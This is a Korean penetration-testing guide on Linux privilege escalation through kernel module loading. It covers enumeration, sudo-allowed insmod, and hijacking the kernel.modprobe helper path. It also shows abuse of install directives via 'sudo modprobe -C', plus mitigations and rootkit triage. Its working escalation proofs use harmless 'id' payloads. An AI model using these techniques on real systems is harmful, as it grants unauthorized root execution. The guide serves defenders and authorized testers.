# Kernel Modules 및 modprobe 악용

{{#include ../../banners/hacktricks-training.md}}

## Kernel module 및 모듈 로딩 설정 오류

Kernel module 지원은 Linux 권한 상승 검토에서 영향도가 큰 영역입니다. 서명되지 않은 모듈 관련 메시지가 있다는 이유만으로 모두 악용 가능하다고 판단하지 말고, 이를 통해 실질적인 질문에 답하세요.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- 현재 사용자가 `sudo`, capabilities 또는 쓰기 가능한 helper 경로를 통해 모듈을 로드할 수 있는가?
- 모듈 로딩이 여전히 활성화되어 있는가?
- 모듈 서명 강제가 비활성화되어 있는가?
- 모듈 디렉터리, 모듈 파일 또는 `modprobe.d` 설정 경로에 쓸 수 있는가?<sup>[[16]](#references)</sup>
- 무슨 일이 있었는지 확인하기 위해 kernel 로그를 읽을 수 있는가?

빠른 초기 점검은 다음과 같은 모듈 상태, 서명, 로깅 및 모듈 트리 확인부터 시작합니다.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

해석:

- `modules_disabled=1`은 모듈을 로드하거나 언로드할 수 없으며, 재부팅하기 전까지 값을 `0`으로 재설정할 수 없다는 뜻입니다.<sup>[[1]](#references)</sup>
- 커널 명령줄의 `module.sig_enforce=1` 또는 `CONFIG_MODULE_SIG_FORCE=y`는 유효한 서명이 있는 모듈을 요구합니다. 그렇지 않으면 서명되지 않은 모듈도 로드될 수 있으며 커널에 taint가 표시됩니다.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0`이면 `dmesg`에 제한이 없습니다. 값이 `1`이면 접근에 `CAP_SYSLOG`가 필요합니다.<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` 아래의 쓰기 가능한 경로는 위험합니다. `modprobe`가 모듈을 로드할 때 해당 트리와 종속성 데이터를 검색하기 때문입니다.<sup>[[8]](#references)</sup>

### 모듈 로드 및 커널 출력 확인

로컬 모듈을 로드할 정당한 권한이 있다면, `insmod`는 지정한 정확한 `.ko` 파일을 삽입합니다. 로드 과정에서 모듈의 init 함수가 실행되고, `printk()`로 기록한 메시지는 커널 로그 버퍼에 저장됩니다. 이 로그는 일반적으로 `dmesg`로 확인합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

기본적인 검토 절차에서는 `modinfo`로 메타데이터를 확인하고, `insmod`와 `rmmod`로 모듈을 로드 및 제거하며, `lsmod`로 로드 상태를 확인하고, `dmesg`로 커널 로그를 살펴봅니다.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

`sudo -l`에서 `insmod`, `modprobe` 또는 이를 감싼 wrapper의 사용이 허용된다면 이를 치명적인 권한으로 간주하세요. `sudo -l`은 명령을 실행하는 사용자의 권한을 나열하며, kernel module을 로드하려면 `CAP_SYS_MODULE`이 필요합니다. capability를 직접 이용하는 방법은 [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module)를 참조하세요.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo-allowed `insmod`

사용자가 `insmod`를 실행할 수 있도록 허용하는 sudo 규칙은 일반적인 관리 보조 도구의 실행을 허용하는 것과는 다릅니다. 모듈의 초기화 코드는 모듈을 삽입할 때 실행되므로, 실질적인 검토 질문은 이 사용자가 로드할 모듈을 선택하거나 수정할 수 있는지 여부입니다.<sup>[[3]](#references)</sup>

다음의 일반적인 검토 절차에서는 후보 모듈에 대해 검사, 로드, 상태 확인, 로그 확인, 제거 과정을 반복합니다.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

사용자가 임의의 `.ko` 파일을 제공할 수 있다면, 승인된 평가에서 이를 시스템 전체가 침해된 것으로 간주해야 합니다. 더 안전한 운영 방식은 sudo를 통한 모듈 로딩 위임을 피하는 것입니다. 불가피한 경우에는 정확한 경로, 소유권, 권한, 서명 정책 및 제거 절차를 제한해야 합니다.<sup>[[3]](#references)[[10]](#references)</sup>

통제된 lab에서 무해한 모듈 빌드 패턴을 사용하는 경우, 아래와 같이 최소한의 소스와 Makefile을 사용할 수 있습니다. `make -C /lib/modules/$(uname -r)/build M=$PWD` 형식은 외부 모듈에 대해 kernel에 문서화된 kbuild workflow를 따릅니다.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

허가된 실험실에서만 빌드하고 로드하세요. kbuild는 외부 모듈을 빌드하며, 로드/제거 명령은 커널 모듈 인터페이스를 호출합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` 악용 확인

`kernel.modprobe`는 module autoload 요청 시 커널이 실행하는 userspace helper를 지정합니다. 이 sysctl은 명시적인 module 삽입이 아니라 autoload에 영향을 줍니다. 공격자가 이 값을 쓰기 가능한 실행 파일 경로로 변경하고 module 요청을 트리거할 수 있다면, 해당 helper를 통해 권한이 있는 코드 실행이 가능합니다. 빈 문자열로 설정하면 autoload 요청이 비활성화됩니다. `CONFIG_STATIC_USERMODEHELPER=y`인 경우, 비어 있지 않은 값은 컴파일 시 지정된 static helper 경로로 재정의됩니다.<sup>[[1]](#references)</sup>

커널 sysctl 인터페이스를 통해 현재 helper 경로를 확인하고 대상의 소유권과 mode를 검사합니다.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

sysctl, 위임된 sudo 규칙 또는 파일 capability에 영향을 줄 수 있는지 확인합니다.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

다음 lab 전용 패턴은 helper 경로를 변경하고 문서화된 module-autoload 요청을 트리거합니다. 격리된 승인 시스템에서만 사용하세요.<sup>[[1]](#references)</sup>

최신 Linux 커널에서는 알 수 없는 실행 파일을 일반적인 트리거로 사용하지 마세요. 레거시 custom binary-format module autoloading은 Linux 6.14에서 제거되었으며, 커널 문서에서는 알 수 없는 파일 시스템 유형을 module-autoload 요청 경로로 설명합니다.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

강화된 시스템에서는 권한으로 인해 권한이 없는 사용자가 `kernel.modprobe`에 쓸 수 없거나, helper 경로를 쓸 수 없거나, 모듈 자동 로드가 비활성화되어 있으면 이 작업은 실패해야 합니다.<sup>[[1]](#references)</sup>

### 쓰기 가능한 `modprobe.d` 설정과 `sudo modprobe -C`

모듈을 확인하기 전에 `modprobe`는 우선순위 순서에 따라 `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, `/lib/modprobe.d` 등의 설정 디렉터리에서 `.conf` 파일을 읽습니다. 우선순위가 높은 디렉터리에 같은 이름의 파일이 있으면 우선순위가 낮은 디렉터리의 파일을 가립니다. 더 중요한 점은 `install <module> <command>` 지시문이 해당 모듈을 삽입하는 **대신** 임의의 셸 명령을 실행한다는 것입니다. 따라서 나중에 권한이 높은 `modprobe` 호출자가 실행할 때 쓰기 가능한 설정 경로가 지연된 명령 실행 경로가 될 수 있습니다. 커널 모듈 서명 강제는 이 사용자 공간 명령을 인증하지 않습니다.<sup>[[16]](#references)</sup>

디렉터리와 파일 권한을 점검한 다음, 적용되는 설정을 확인하세요. `modprobe -n -v`는 안전하게 설정을 확인할 수 있습니다. dry-run 모드에서는 모듈을 삽입하거나 `install`/`remove` 명령을 실행하지 않기 때문입니다. 현재 kmod 문서에서 kmod 36 이후 제거 예정으로 표시한 기존 `--showconfig` 표기법보다 `modprobe -c`를 사용하세요.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe`에 대한 제한 없는 sudo 규칙은 임의의 `.ko` 파일이 서명 검증을 통과하지 못하더라도 악용할 수 있습니다. `-C`로 공격자가 제어하는 설정 디렉터리를 지정하면, sudo로 실행된 프로세스가 해당 디렉터리의 `install` 명령을 실행할 수 있습니다.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

완화를 위해 argument-unrestricted `modprobe`를 sudo로 허용하지 말고, 모든 configuration 디렉터리를 root 소유로 유지하고 쓰기 불가능하게 설정하며, 예상치 못한 `install`/`remove` directives를 검토하세요. 신뢰할 수 있는 관리 workflow에서 특정 모듈에 대해 이러한 directives를 우회해야 하는 경우, `modprobe --ignore-install`은 해당 모듈에 대해 directives를 무시하지만 dependencies에는 자체 commands가 있을 수 있습니다.<sup>[[8]](#references)[[16]](#references)</sup>

### 쓰기 가능한 `/lib/modules` 검토

쓰기 가능한 모듈 디렉터리는 이후 `modprobe`가 호출되는 방식에 따라 모듈 교체, 악성 모듈 심기 또는 auto-load 악용을 가능하게 할 수 있습니다. `modprobe`는 `/lib/modules/$(uname -r)`를 검색하고 모듈을 확인할 때 dependency 데이터를 사용합니다.<sup>[[8]](#references)</sup>

활성 커널 release의 모듈 트리에서 쓰기 가능한 모듈 파일과 dependency/alias metadata를 검토하세요.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

쓰기 가능한 모듈 콘텐츠를 찾으면 `modprobe`가 종속성을 확인하는 방식과 `modinfo`가 모듈 메타데이터를 표시하는 방식을 살펴보세요.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

방어 참고 사항:

- `/lib/modules`의 소유자를 `root:root`로 유지하고 사용자가 쓰기할 수 없도록 합니다.<sup>[[8]](#references)</sup>
- 운영상 가능한 경우 부팅 후 `kernel.modules_disabled=1`로 설정합니다.<sup>[[1]](#references)</sup>
- loadable modules가 필요한 시스템에서는 module signing을 적용합니다.<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules`, `modprobe.d` configuration 디렉터리에 대한 쓰기와 예상치 못한 `insmod`/`modprobe` 실행을 모니터링합니다.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## 모듈 기반 rootkit 초기 분석

악성 모듈은 syscall, VFS 또는 `/proc` 뷰, 네트워크 경로, credential 검사를 후킹해 프로세스와 파일을 숨기거나, 트래픽을 우회하거나, 비밀 정보를 가로챌 수 있습니다. 또한 `lsmod`에 표시되는 모듈 목록에서 자신을 제거할 수도 있습니다. 지속성은 `modprobe.d` 별칭이나 install 규칙, `/etc/modules-load.d`, systemd unit, initramfs 콘텐츠 또는 정상 `.ko` 파일의 교체를 통해 확보될 수 있습니다. 정상적인 `lsmod` 결과는 유용한 증거지만, kernel 수준의 침해가 발생하면 kernel이 제공하는 목록은 신뢰할 수 없게 될 수 있습니다. 로드된 모듈, 디스크상의 파일, 부팅 설정, 모듈 로드 로그, 신뢰할 수 있는 외부 telemetry를 서로 대조하세요.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

예상치 못한 모듈 이름, 경로, 종속성, 서명, 로드 시간을 확인하세요. Kernel taint 및 unsigned-module 메시지는 단서일 뿐, rootkit의 증거는 아닙니다. rootkit이 의심되면 실행 중인 kernel의 출력에 의존하기 전에 신뢰할 수 있는 이미지나 복구 환경에서 증거를 수집하세요. [kernel vulnerability assessment](kernel-vulnerability-assessment.md) 페이지에서는 tracefs 및 pinned BPF objects를 포함한 구성과 진단 정보 노출을 다룹니다.

## References

- [1] [/proc/sys/kernel/ 문서 — Linux Kernel 문서](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module 서명 기능 — Linux Kernel 문서](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver 기본 사항 — Linux Kernel 문서](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk를 사용한 메시지 로깅 — Linux Kernel 문서](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [외부 모듈 빌드 — Linux Kernel 문서](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [태그 'execve-v6.14-rc1' 병합 — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
